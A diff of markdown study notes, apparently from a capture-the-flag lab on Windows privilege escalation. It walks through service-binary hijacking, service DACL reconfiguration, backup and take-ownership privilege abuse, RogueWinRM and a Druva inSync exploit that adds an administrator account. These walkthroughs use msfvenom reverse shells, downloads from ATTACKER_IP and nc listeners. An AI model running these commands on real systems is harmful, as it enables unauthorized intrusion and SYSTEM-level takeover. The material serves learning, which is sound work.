@@ -216,7 +216,7 @@ HKLM\SYSTEM\CurrentControlSet\Services\
 
 ## Insecure Permissions on Service Executable
 * Attacker can gain privileges of service's account trivially if service executable has insecure permsissions.
-* Splinterware System Scheduler vulnerability example.
+### Splinterware System Scheduler vulnerability Use Case
 ```
 sc.exe qc WindowsScheduler
 [SC] QueryServiceConfig SUCCESS
@@ -232,7 +232,7 @@ SERVICE_NAME: windowsscheduler
         DEPENDENCIES       :
         SERVICE_START_NAME : .\svcuser1
 ```
-* Check permissions on the executable.
+#### 1. Check permissions on the executable.
 ```
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
@@ -247,20 +247,20 @@ Successfully processed 1 files; Failed processing 0 files
 * Everyone group has modify permissions `(M)` on executable.
 * Executable can be overwritten with malicious payload.
 * Service will be executed with privileges of "svcuser1" user account.
-* Generate exe-service payload using `msfvenom`.
+#### 2. Generate exe-service payload using `msfvenom`.
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 ``` 
-* Serve payload through python webserver.
+#### 3. Serve payload through python webserver.
 ```
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-* Pull payload from PowerShell.
+#### 4. Pull payload from PowerShell.
 ```
 wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 ``` 
-* Replace service executable with payload.
+#### 5. Replace service executable with payload.
 ```
 cd C:\PROGRA~2\SYSTEM~1\
 
@@ -270,23 +270,23 @@ move WService.exe WService.exe.bkp
 move C:\Users\thm-unpriv\rev-svc.exe WService.exe
         1 file(s) moved.
 ```
-* Grant full permissions to Everyone group as need another user to execute payload.
+#### 6. Grant full permissions to Everyone group as need another user to execute payload.
 ```
 icacls WService.exe /grant Everyone:F
 ```
-* Start reverse listener on attacking machine.
+#### 7. Start reverse listener on attacking machine.
 ```
 nc -lvnp 4445
 Listening on 0.0.0.0 4445
 ```
-* Restart service (if current user has permissions).
+#### 8. Restart service (if current user has permissions).
 * PowerShell has `sc` as an alias to `Set-Content`.
   * Need to use `sc.exe` to control services with PowerShell this way.
 ```
 sc.exe stop windowsscheduler
 sc.exe start windowsscheduler
 ```
-* Reverse shell with "svcusr1" privileges received.
+#### 9. Reverse shell with "svcusr1" privileges received.
 ```
 Connection received on 10.10.175.90 50649
 Microsoft Windows [Version 10.0.17763.1821]
@@ -332,7 +332,8 @@ SERVICE_NAME: disk sorter enterprise
   * `C:\Program Files (x86)`
 * Some installers reduce permissions of installed folder.
 * Administrator may install service binaries in world-writable non-default path.
-* `c:\MyPrograms` inherits permissions of `C:\`.
+### `c:\MyPrograms` Use Case.
+  * Golder inherits permissions of `C:\`
   * Any user can create files and folders. 
 ```
 icacls c:\MyPrograms
@@ -346,39 +347,39 @@ c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 Successfully processed 1 files; Failed processing 0 files
 ```
 * `BUILTIN\Users` group has `(AD)` (create subdirectories) and `(WD)` (create files) privileges on folder.
-* Create `msfvenom` exe-service payload.
+#### 1. Create `msfvenom` exe-service payload.
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
 ```
-* Serve payload through python webserver.
+#### 2. Serve payload through python webserver.
 ```
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-* Pull payload from PowerShell.
+#### 3. Pull payload from PowerShell.
 ```
 wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
 ``` 
-* Start listener to receive reverse shell.
+#### 4. Start listener to receive reverse shell.
 ```
 nc -lvnp 4446
 Connection received on 10.10.175.90 50650
 ```
-* Move payload to `c:\MyPrograms\Disk.exe`.
+#### 5. Move payload to `c:\MyPrograms\Disk.exe`.
 ```
 move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
 ```
-* Grant Everyone full permission on file.
+#### 6. Grant Everyone full permission on file.
   * Ensures file can be executed by the service.
 ```
 icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 ```
-* Restart service to execute payload.
+#### 7. Restart service to execute payload.
 ```
 sc.exe stop "disk sorter enterprise"
 sc.exe start "disk sorter enterprise"
 ```
-* Reverse shell with "svcusr2" privileges received.
+#### 8. Reverse shell with "svcusr2" privileges received.
 ```
 Microsoft Windows [Version 10.0.17763.1821]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -390,7 +391,7 @@ wprivesc1\svcusr2
 * Service DACL (not service's executable DACL) allows reconfiguration of the service.
 * Point service at any executable and run it with any account.
 * [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from Sysinternals suite used to check for service DACL.
-  * Command to check for "thmservice" DACL.
+### "thmservice" DACL Use Case.
 ```
 accesschk64.exe -qlc thmservice
   [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
@@ -408,36 +409,36 @@ accesschk64.exe -qlc thmservice
 ```
 * `BUILTIN\Users` group has `SERVICE_ALL_ACCESS` permission.
    * Any user can reconfigure service.
-* Build exe-service reverse shell in `msfvenom`.
+#### 1. Build exe-service reverse shell in `msfvenom`.
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
 ```
-* Start listener for connection on attacker's machine.
+#### 2. Start listener for connection on attacker's machine.
 ```
 nc -lvnp 4447
 Listening on [0.0.0.0] (family 0, port 4447)
 ```
-* Serve payload through python webserver.
+#### 3. Serve payload through python webserver.
 ```
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-* Pull payload from PowerShell.
+#### 4. Pull payload from PowerShell.
 ```
 wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe
 ``` 
-* Move payload to `C:\Users\thm-unpriv\rev-svc3.exe` if necessary.
-* Grant "Everyone" permission to execute payload.
+#### 5. Move payload to `C:\Users\thm-unpriv\rev-svc3.exe` if necessary.
+#### 6. Grant "Everyone" permission to execute payload.
 ```
 icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
 ```
-* Change service's associated executable and account.
+#### 7. Change service's associated executable and account.
   * Note spaces after equal signs when using `sc`.
   * LocalSystem account chosen as it is highest privilege account available.
 ```
 sc.exe config thmservice binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 ```
-* Restart service to trigger payload.
+#### 8. Restart service to trigger payload.
 ```
 sc.exe stop thmservice
 
@@ -458,7 +459,7 @@ SERVICE_NAME: thmservice
         PID                : 3328
         FLAGS              :
 ```
-* Shell recieved back to attacker with SYSTEM privileges.
+#### 9. Shell recieved back to attacker with SYSTEM privileges.
 ```
 Connection from 10.10.29.166 49894 received!
 Microsoft Windows [Version 10.0.17763.1821]
@@ -478,7 +479,7 @@ nt authority\system
   * Ignores any DACL in place.
 * Rationale is to allow certain users to perform backups without requiring full admin rights.
 * Attacker can trivially escalate privileges with these privileges.
-### Copy SAM and SYSTEM registry hives to extract Administrator's password hash
+### Copy SAM and SYSTEM registry hives to extract Administrator's password hash Use Case
 #### 1. RDP to target.
 ```
 xfreerdp /u:THMBackup /p:CopyMaster555 /v:10.10.21.86
@@ -549,7 +550,7 @@ nt authority\system
 * Allows user to take ownership of any object on a system.
 * Opens up many possibilities for an attacker to elevate privileges.
   * E.g. Take ownership of a service's executable that is running as SYSTEM.
-### Abuse `utilman.exe` to escalate privileges
+### Abuse `utilman.exe` to escalate privileges Use Case
 * Utilman is built-in Window app used to provide Ease of Access options during lock screen.
 * Runs with SYSTEM privileges.
 #### 1. RDP to target machine.
@@ -606,7 +607,7 @@ nt authority\system
 ## SeImpersonate / SeAssignPrimaryToken Privileges
 * Allow a process to impersonate users and act on their behalf.
   * E.g. spawn a process or thread under the security context of another user.
-### FTP Example
+### FTP Use Case
 1. FTP service running with user "ftp".
 2. User "Ann" logs onto the FTP server to access their files.
 3. FTP service tries to access the files using its access token rather than Ann's
@@ -627,7 +628,7 @@ nt authority\system
      *  Used to spawn services using restricted accounts.
      *  Logical for them to impersonate connecting users.
   *  IIS creates similar default account `iis apppool\defaultapppool` for web apps.
-## RogueWinRM exploit example
+## RogueWinRM Exploit Use Case
 * Exploit is possible because whenever a user starts the BITS service it automatically creates a connection to TCP/5985 using SYSTEM privileges.
   * TCP/5985 typically used by WinRM service.
   * Port exposes PowerShell console to be used remotely.
@@ -706,6 +707,7 @@ wmic product get name.version,vendor
    * `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`
    * Set command string to be executed.
 * Original exploit published [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html).
+#### 1. Execute Exploit in PowerShell Concsole.
 * Full exploit code.
 ```
 # Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
@@ -746,7 +748,7 @@ $s.Send($command)
 ```
 $cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
 ```
-* Verify that `pwnd` user exists and is member of administrators group.
+#### 2. Verify that `pwnd` user exists and is member of administrators group.
 ```
 net user pwnd
 User name                    pwnd
@@ -757,9 +759,12 @@ Account active               Yes
 Local Group Memberships      *Administrators       *Users
 Global Group memberships     *None
 ```
-* Run command prompt as administrator.
+#### 3. Run command prompt as administrator.
   * Use `pwnd` credentials.
 # Tools of the Trade
-
+## WinPEAS
+## PrivescCheck
+## WES-NG: Windows Exploit Suggester - Next Generation
+## Metasploit
 
 # Conclusion
